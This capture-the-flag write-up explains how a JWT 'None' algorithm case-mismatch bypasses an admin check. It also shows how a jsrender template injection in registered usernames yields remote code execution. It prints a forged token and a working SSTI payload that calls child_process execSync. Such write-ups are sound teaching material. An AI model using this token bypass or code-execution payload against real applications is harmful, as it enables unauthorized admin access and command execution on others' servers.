# Didactic Octo Paddles (medium)
In this challenge we will exploit JWT tokens and use SSTI to get RCE.

Spawning the website a login panel pops up. Nothing much we can do here, let's check the provided source code.

We see that most endpoints are protected with the login prompt.
We notice the register endpoint, so we could try to register and login with a user to further explore the site, however the **admin** endpoint seems way more interesting.

```javascript
    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```

First of all there seems to be a clear SSTI bug which can be influenced by the usernames.
So here it will be useful to register a user with a username that will trigger the SSTI and give us RCE, but first we need to successfully authenticate as admin.

But the second reason this endpoint is so interesting is because it uses the `AdminMiddleware` instead of the usual `AuthMiddleware`, interesting... let's see what the `AdminMiddleware` does.


```javascript
const jwt = require("jsonwebtoken");
const { tokenKey } = require("../utils/authorization");
const db = require("../utils/database");

const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};

module.exports = AdminMiddleware;
```

Ok, so we will need a session cookie first of all.
The algorithm can't be *none* because then we are forced to log in.
It also can't be `HS256`, because then the token is verified against the secret, which is random.
Therefore our only choice is to go into the `else` case.

We see the token is verified, but instead of a secret value `null` is provided.
This is our chance to bypass the authentication.
Some of the choices that first came to mind:
    * Type juggling: provide algorithm as an array/object/boolean etc.
    * Provide another algorithm such as `HS512`

However both of these approaches fail, to see why let's look into the `jsonwebtoken` source code.

```javascript
// verify.js:102
    if(err) {
      return done(new JsonWebTokenError('error in secret or public key callback: ' + err.message));
    }

    const hasSignature = parts[2].trim() !== '';

    if (!hasSignature && secretOrPublicKey){
      return done(new JsonWebTokenError('jwt signature is required'));
    }

    if (hasSignature && !secretOrPublicKey) {
      return done(new JsonWebTokenError('secret or public key must be provided'));
    }

    if (!hasSignature && !options.algorithms) {
      return done(new JsonWebTokenError('please specify "none" in "algorithms" to verify unsigned tokens'));
    }
```

`secretOrPublicKey` is the second argument to the call, that we know is `null`.

From this we can deduce that our forged JWT token should not have a signature part, otherwise the verification fails (second `if` statement)

From the third `if` statement we deduce that `algorithms` needs to be set, even if there are no signatures.

```javascript
// verify.js:148
    if (header.alg.startsWith('HS') && secretOrPublicKey.type !== 'secret') {
      return done(new JsonWebTokenError((`secretOrPublicKey must be a symmetric key when using ${header.alg}`)))
    } else if (/^(?:RS|PS|ES)/.test(header.alg) && secretOrPublicKey.type !== 'public') {
      return done(new JsonWebTokenError((`secretOrPublicKey must be an asymmetric key when using ${header.alg}`)))
    }
```

Here we see that if use any other algorithm than *none* a field of `secretOrPublicKey` is accessed, so we can't use an alternative algorithm to `HS256` that is not `none`.

```javascript
// verify.js:162
    let valid;

    try {
      valid = jws.verify(jwtString, decodedToken.header.alg, secretOrPublicKey);
    } catch (e) {
      return done(e);
    }
```

Then our variables are passed to `jws.verify`, let's look into what happens there.

*jws* calls *jwa* internally to get the verification algorithm based on what we provide in `alg`.

Let's see what happens when `jwa` is called:

```javascript
// index.js:227
module.exports = function jwa(algorithm) {
  var signerFactories = {
    hs: createHmacSigner,
    rs: createKeySigner,
    ps: createPSSKeySigner,
    es: createECDSASigner,
    none: createNoneSigner,
  }
  var verifierFactories = {
    hs: createHmacVerifier,
    rs: createKeyVerifier,
    ps: createPSSKeyVerifier,
    es: createECDSAVerifer,
    none: createNoneVerifier,
  }
  var match = algorithm.match(/^(RS|PS|ES|HS)(256|384|512)$|^(none)$/i);
  if (!match)
    throw typeError(MSG_INVALID_ALGORITHM, algorithm);
  var algo = (match[1] || match[3]).toLowerCase();
  var bits = match[2];

  return {
    sign: signerFactories[algo](bits),
    verify: verifierFactories[algo](bits),
  }
};
```

Here we see that to match the algorithm a regex is used.
All looks good, however not the flag used: `i`, the case insensitive flag.
This means that `none`, `None`, and `NONE` would be all valid matches.

Furthermore when `algo` is decided the match itself is converted to lower case letters.

But recall how in the `AdminMiddleware` we execute a case sensitive comparison with `==`.

And here we have our first bug, which allows us to bypass the JWT token verification for admin.

We will send the following JWT token: `eyJhbGciOiAiTm9uZSIsInR5cCI6IkpXVCJ9.eyJpZCI6MX0.`, encoded in the second part is the user ID we want, which is 1 for the admin.

Now all that is left to do is to send a POST request to the `/register` endpoint and create a user with the SSTI payload as the username.

```
payload: {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
```

Now we log in with the **admin** user with the JWT bypass, and just enjoy the flag.
